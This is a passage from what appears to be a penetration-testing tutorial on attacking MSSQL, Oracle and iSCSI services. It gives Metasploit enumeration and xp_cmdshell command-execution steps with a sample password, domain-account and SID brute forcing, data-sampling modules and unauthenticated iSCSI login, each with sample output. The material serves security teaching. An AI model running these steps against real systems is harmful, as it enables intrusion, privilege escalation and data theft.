<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Running MS SQL Server Enumeration...
</span><span class='line'>[*] Version:
</span><span class='line'>[*]   Microsoft SQL Server 2012 - 11.0.xx.xx (X64) 
</span><span class='line'>[*]       Feb 10 2012 19:39:15 
</span><span class='line'>[*]       Copyright (c) Microsoft Corporation
</span><span class='line'>[*]       Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
</span><span class='line'>[*] Configuration Parameters:
</span><span class='line'>[*]   C2 Audit Mode is Not Enabled
</span><span class='line'>[*]   xp_cmdshell is Enabled
</span><span class='line'>[*]   remote access is Enabled
</span><span class='line'>[*]   allow updates is Not Enabled
</span><span class='line'>[*]   Database Mail XPs is Not Enabled
</span><span class='line'>[*]   Ole Automation Procedures are Not Enabled
</span><span class='line'>[*] Databases on the server:
</span><span class='line'>[*]   Database name:master
</span><span class='line'>[*]   Database Files for master:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\master.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
</span><span class='line'>[*]   Database name:tempdb
</span><span class='line'>[*]   Database Files for tempdb:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\tempdb.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\templog.ldf
</span><span class='line'>[*]   Database name:model
</span><span class='line'>[*]   Database Files for model:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\model.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\modellog.ldf
</span><span class='line'>[*]   Database name:msdb
</span><span class='line'>[*]   Database Files for msdb:
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
</span><span class='line'>[*]       C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
</span><span class='line'>[*]   Database name:ReportServer
</span><span class='line'>[*]   Database Files for ReportServer:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer_log.ldf
</span><span class='line'>[*]   Database name:ReportServerTempDB
</span><span class='line'>[*]   Database Files for ReportServerTempDB:
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB.mdf
</span><span class='line'>[*]       D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB_log.ldf
</span><span class='line'>[*] System Logins on this Server:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   ##MS_SQLResourceSigningCertificate##
</span><span class='line'>[*]   ##MS_SQLReplicationSigningCertificate##
</span><span class='line'>[*]   ##MS_SQLAuthenticatorCertificate##
</span><span class='line'>[*]   ##MS_PolicySigningCertificate##
</span><span class='line'>[*]   ##MS_SmoExtendedSigningCertificate##
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*]   ##MS_AgentSigningCertificate##
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT AUTHORITY\SYSTEM
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*]   NT SERVICE\ReportServer
</span><span class='line'>[*] Disabled Accounts:
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*] No Accounts Policy is set for:
</span><span class='line'>[*]   All System Accounts have the Windows Account Policy Applied to them.
</span><span class='line'>[*] Password Expiration is not checked for:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   ##MS_PolicyEventProcessingLogin##
</span><span class='line'>[*]   ##MS_PolicyTsqlExecutionLogin##
</span><span class='line'>[*] System Admin Logins on this Server:
</span><span class='line'>[*]   sa
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*] Windows Logins on this Server:
</span><span class='line'>[*]   EXAMPLE\Administrator
</span><span class='line'>[*]   OTH-EXAMPLE\altadmin
</span><span class='line'>[*]   NT SERVICE\SQLWriter
</span><span class='line'>[*]   NT SERVICE\Winmgmt
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*]   NT AUTHORITY\SYSTEM
</span><span class='line'>[*]   NT SERVICE\SQLSERVERAGENT
</span><span class='line'>[*]   NT SERVICE\ReportServer
</span><span class='line'>[*] Windows Groups that can logins on this Server:
</span><span class='line'>[*]   No Windows Groups where found with permission to login to system.
</span><span class='line'>[*] Accounts with Username and Password being the same:
</span><span class='line'>[*]   No Account with its password being the same as its username was found.
</span><span class='line'>[*] Accounts with empty password:
</span><span class='line'>[*]   No Accounts with empty passwords where found.
</span><span class='line'>[*] Stored Procedures with Public Execute Permission found:
</span><span class='line'>[*]   sp_replsetsyncstatus
</span><span class='line'>[*]   sp_replcounters
</span><span class='line'>[*]   sp_replsendtoqueue
</span><span class='line'>[*]   sp_resyncexecutesql
</span><span class='line'>[*]   sp_prepexecrpc
</span><span class='line'>[*]   sp_repltrans
</span><span class='line'>[*]   sp_xml_preparedocument
</span><span class='line'>[*]   xp_qv
</span><span class='line'>[*]   xp_getnetname
</span><span class='line'>[*]   sp_releaseschemalock
</span><span class='line'>[*]   sp_refreshview
</span><span class='line'>[*]   sp_replcmds
</span><span class='line'>[*]   sp_unprepare
</span><span class='line'>[*]   sp_resyncprepare
</span><span class='line'>[*]   sp_createorphan
</span><span class='line'>[*]   xp_dirtree
</span><span class='line'>[*]   sp_replwritetovarbin
</span><span class='line'>[*]   sp_replsetoriginator
</span><span class='line'>[*]   sp_xml_removedocument
</span><span class='line'>[*]   sp_repldone
</span><span class='line'>[*]   sp_reset_connection
</span><span class='line'>[*]   xp_fileexist
</span><span class='line'>[*]   xp_fixeddrives
</span><span class='line'>[*]   sp_getschemalock
</span><span class='line'>[*]   sp_prepexec
</span><span class='line'>[*]   xp_revokelogin
</span><span class='line'>[*]   sp_resyncuniquetable
</span><span class='line'>[*]   sp_replflush
</span><span class='line'>[*]   sp_resyncexecute
</span><span class='line'>[*]   xp_grantlogin
</span><span class='line'>[*]   sp_droporphans
</span><span class='line'>[*]   xp_regread
</span><span class='line'>[*]   sp_getbindtoken
</span><span class='line'>[*]   sp_replincrementlsn
</span><span class='line'>[*] Instances found on this server:
</span><span class='line'>[*]   MSSQLSERVER
</span><span class='line'>[*]   SQLEXPRESS
</span><span class='line'>[*] Default Server Instance SQL Server Service is running under the privilege of:
</span><span class='line'>[*]   NT Service\MSSQLSERVER
</span><span class='line'>[*] Instance SQLEXPRESS SQL Server Service is running under the privilege of:
</span><span class='line'>[*]   NT AUTHORITY\NETWORKSERVICE
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Next, we can execute command using <strong>Microsoft SQL Server xp_cmdshell Command Execution</strong> if xp_cmdshell is enabled and if the user has permissions.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_exec
</span><span class='line'>set RHOst 10.10.xx.xx
</span><span class='line'>set password company@123
</span><span class='line'>set cmd ipconfig</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Windows IP Configuration
</span><span class='line'> 
</span><span class='line'> 
</span><span class='line'> Ethernet adapter LAN:
</span><span class='line'> 
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'>    IPv4 Address. . . . . . . . . . . : 10.10.xx.xx
</span><span class='line'>    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
</span><span class='line'>    Default Gateway . . . . . . . . . : 10.10.xx.xx
</span><span class='line'> 
</span><span class='line'> Ethernet adapter Local Area Connection 3:
</span><span class='line'> 
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'>    Link-local IPv6 Address . . . . . : fe80::798f:6cad:4f1e:c5fb%15
</span><span class='line'>    Autoconfiguration IPv4 Address. . : 169.254.xx.xx
</span><span class='line'>    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
</span><span class='line'>    Default Gateway . . . . . . . . . : 
</span><span class='line'> 
</span><span class='line'> Tunnel adapter isatap.{D295B095-19EB-436E-97D0-4D22486521CC}:
</span><span class='line'> 
</span><span class='line'>    Media State . . . . . . . . . . . : Media disconnected
</span><span class='line'>    Connection-specific DNS Suffix  . : 
</span><span class='line'> 
</span><span class='line'> Tunnel adapter isatap.{A738E25A-F5E3-4E36-8F96-6977E22136B6}:
</span><span class='line'> 
</span><span class='line'>    Media State . . . . . . . . . . . : Media disconnected
</span><span class='line'>    Connection-specific DNS Suffix  . : </span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>Scott Sutherland has written four parts of <strong>Hacking SQL Servers</strong>:  ( A must-read )</p>

<ol>
<li>
<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">Hacking SQL Server Stored Procedures  Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db_Owner 'mssql_escalate_dbowner'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/">Hacking SQL Server Stored Procedures  Part 2: User Impersonation</a>   : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS 'mssql_escalate_execute_as'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">Hacking SQL Server Stored Procedures  Part 3: SQL Injection</a>   : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">Hacking SQL Server Procedures  Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). Ill also show how to enumerate SQL Server logins using a similar technique. Corresponding module is <strong>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_enum_domain_accounts
</span><span class='line'>set rhost 10.10.xx.xx
</span><span class='line'>set password company@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Attempting to connect to the database server at 10.10.xx.xx:1433 as sa...
</span><span class='line'>[+] Connected.
</span><span class='line'>[*] SQL Server Name: EXAMPLECRM1
</span><span class='line'>[*] Domain Name: EXAMPLE
</span><span class='line'>[+] Found the domain sid: 01050000000000051500000016c0ea32f450ba7443170a32
</span><span class='line'>[*] Brute forcing 10000 RIDs through the SQL Server, be patient...
</span><span class='line'>[*]  - EXAMPLE\administrator
</span><span class='line'>[*]  - EXAMPLE\Guest
</span><span class='line'>[*]  - EXAMPLE\krbtgt
</span><span class='line'>[*]  - EXAMPLE\Domain Admins
</span><span class='line'>[*]  - EXAMPLE\Domain Users
</span><span class='line'>[*]  - EXAMPLE\Domain Guests
</span><span class='line'>[*]  - EXAMPLE\Domain Computers
</span><span class='line'>[*]  - EXAMPLE\Domain Controllers
</span><span class='line'>[*]  - EXAMPLE\Cert Publishers
</span><span class='line'>[*]  - EXAMPLE\Schema Admins
</span><span class='line'>[*]  - EXAMPLE\Enterprise Admins
</span><span class='line'>[*]  - EXAMPLE\Group Policy Creator Owners
</span><span class='line'>[*]  - EXAMPLE\Read-only Domain Controllers
</span><span class='line'>[*]  - EXAMPLE\RAS and IAS Servers
</span><span class='line'>[*]  - EXAMPLE\Allowed RODC Password Replication Group
</span><span class='line'>[*]  - EXAMPLE\Denied RODC Password Replication Group
</span><span class='line'>[*]  - EXAMPLE\TsInternetUser</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p>Other fun modules to check are</p>

<ol>
<li> <strong>Microsoft SQL Server Find and Sample Data</strong>: This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_findandsampledata </span></code></pre></td></tr></table></div></figure>
</li>
<li>
<strong>Microsoft SQL Server Generic Query</strong>: This module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropiate credentials.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/mssql/mssql_sql</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>MSSQL Schema Dump</strong>: This module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mssql/mssql_schemadump</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>We can also use</p>

<ol>
<li>
<strong>tsql command</strong>, install it by using freetds-bin package and use it like
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123
</span><span class='line'>locale is "en_IN"
</span><span class='line'>locale charset is "UTF-8"
</span><span class='line'>using default charset "UTF-8"
</span><span class='line'>1&gt; SELECT suser_sname(owner_sid)
</span><span class='line'>2&gt; FROM sys.databases
</span><span class='line'>3&gt; go
</span><span class='line'>
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>sa
</span><span class='line'>EXAMPLE\administrator
</span><span class='line'>EXAMPLE\administrator
</span><span class='line'>EXAMPLE\kuanxxxx
</span><span class='line'>(7 rows affected)</span></code></pre></td></tr></table></div></figure>
See examples for Scott blogs, how to execute queries.
</li>
<li>We can also use <strong>Microsoft SQL Server Management</strong> to connect to Remote Database.</li>
</ol>


<h3>Oracle | Port 1521</h3>

<p>After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a></p>

<p><strong>Metasploit</strong> has</p>

<p><ol>
<li>we can use <strong>Oracle TNS Listener Service Version Query</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/tnslsnr_version
</span><span class='line'>services -p 1521 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:1521 Oracle - Version: 64-bit Windows: Version 11.1.0.7.0 - Production
</span><span class='line'>[-] 10.10.xx.xx:1521 Oracle - Version: Unknown - Error code 1189 - The listener could not authenticate the user
</span><span class='line'>[-] 10.10.xx.xx:1521 Oracle - Version: Unknown
</span><span class='line'>[*] Scanned  8 of 12 hosts (66% complete)
</span><span class='line'>[+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/tnspoison_checker
</span><span class='line'>services -p 1521 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:1521 is vulnerable
</span><span class='line'>[+] 10.10.xx.xx:1521 is vulnerable
</span><span class='line'>[*] Scanned  2 of 12 hosts (16% complete)
</span><span class='line'>[-] 10.10.xx.xx:1521 is not vulnerable </span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
We can also use <strong>Oracle TNS Listener SID Bruteforce</strong> which queries the TNS listner for a valid Oracle database instance name (also known as a SID). Oracle TNS Listener SID Enumeration can only be used if the oracle version is less than Oracle 9.2.xx.xx.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/oracle/sid_brute
</span><span class='line'>services -p 1521 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:1521 Oracle - &lsquo;CLREXTPROC&rsquo; is valid
</span><span class='line'>[*] 10.10.xx.xx:1521  - Oracle - Refused &lsquo;CLREXTPROC&rsquo;
</span><span class='line'>[+] 10.10.xx.xx:1521 Oracle - &lsquo;CLREXTPROC&rsquo; is valid</span></code></pre></td></tr></table></div></figure>  <br/>
</li></p>

<h3>ISCSI | Port 3260</h3>

<p>Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a href="https://pig.made-it.com/iSCSI.html">SCSI over IP</a>
<br>
<br>
<strong>Nmap</strong> has</p>

<p><ol>
<li><a href="https://nmap.org/nsedoc/scripts/iscsi-info.html">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -p 3260 192.168.xx.xx &ndash;script=iscsi-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-04 14:50 IST
</span><span class='line'>Nmap scan report for 192.168.xx.xx
</span><span class='line'>Host is up (0.00064s latency).
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>3260/tcp open  iscsi?
</span><span class='line'>| iscsi-info:
</span><span class='line'>|   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe:
</span><span class='line'>|     Address: 192.168.xx.xx:3260,1
</span><span class='line'>|_    Authentication: NOT required
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Hacking Team DIY shows to run</p>

<p><ol>
<li> We can discover the target IP address by using the below command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m discovery -t sendtargets -p 192.168.xx.xx
</span><span class='line'>192.168.xx.xx:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe</span></code></pre></td></tr></table></div></figure>
</li>
<li> Login via
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -l -p 192.168.xx.xx &ndash;login -
</span><span class='line'>Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] (multiple)
</span><span class='line'>Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span></code></pre></td></tr></table></div></figure></li></p>

<p><li> When we login, ideally we should be able to see the location, however for some strange reason we didn&rsquo;t got that here.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[43852.014179] scsi host6: iSCSI Initiator over TCP/IP
</span><span class='line'>[43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5
</span><span class='line'>[43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0</span></code></pre></td></tr></table></div></figure></li>
<li>We can logout using &ndash;logout
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -p 192.168.xx.xx &ndash;logout
</span><span class='line'>Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260]
</span><span class='line'>Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span></code></pre></td></tr></table></div></figure></li>
<li>We can find more information about it by just using without any &ndash;login/&ndash;logout parameter
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -p 192.168.xx.xx
</span><span class='line'># BEGIN RECORD 2.0-873
</span><span class='line'>node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
</span><span class='line'>node.tpgt = 1
</span><span class='line'>node.startup = manual
</span><span class='line'>node.leading_login = No
</span><span class='line'>iface.hwaddress = &lt;empty&gt;
</span><span class='line'>iface.ipaddress = &lt;empty&gt;
</span><span class='line'>iface.iscsi_ifacename = default
</span><span class='line'>iface.net_ifacename = &lt;empty&gt;
</span><span class='line'>iface.transport_name = tcp
</span><span class='line'>iface.initiatorname = &lt;empty&gt;
</span><span class='line'>iface.bootproto = &lt;empty&gt;
</span><span class='line'>iface.subnet_mask = &lt;empty&gt;
</span><span class='line'>iface.gateway = &lt;empty&gt;
